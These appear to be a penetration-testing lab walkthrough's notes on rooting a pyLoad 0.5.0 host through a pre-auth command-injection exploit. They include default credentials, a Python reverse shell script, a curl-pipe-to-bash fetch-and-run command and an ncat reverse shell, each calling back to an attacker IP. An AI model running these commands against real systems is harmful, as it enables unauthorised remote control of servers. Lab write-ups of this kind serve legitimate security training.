npam shows ports 22 and 9666 open
9666 is running pyload
searchsploit shows a pre-auth exploit for version 0.5.0

Default credential lookup shows pyload:pyload, which logs us in
Under info, we see the version is indeed 0.5.0

However, the exploit has fialed to give us reverse shell so far, with direct payloads.

So we test it
```zsh
sudo tcpdump -i tun0 icmp -n
python 51532.py -u http://192.168.129.26:9666 -c "ping -c 1 192.168.45.221" 
#this gives us a ping
#so chances are, the shell might be restricted, or something is preventing nc
python 51532.py -u http://192.168.129.26:9666 -c "curl 192.168.45.221/file"
#This sends us a request
```

We create a reverse shell, and host it on a python server for the victim to run it
```sh
$ cat exploit.sh  
#!/bin/bash  
  
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.221",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Then make the victim curl this file and pipe it to bash
```zsh
python 51532.py -u http://192.168.129.26:9666 -c "curl 192.168.45.221/exploit.sh | /bin/bash"
```
root!

---
---
Alternatively, could've used ncat
```zsh
python 51532.py -u http://192.168.129.26:9666 -c "ncat 192.168.45.221 22 -e /bin/bash"
```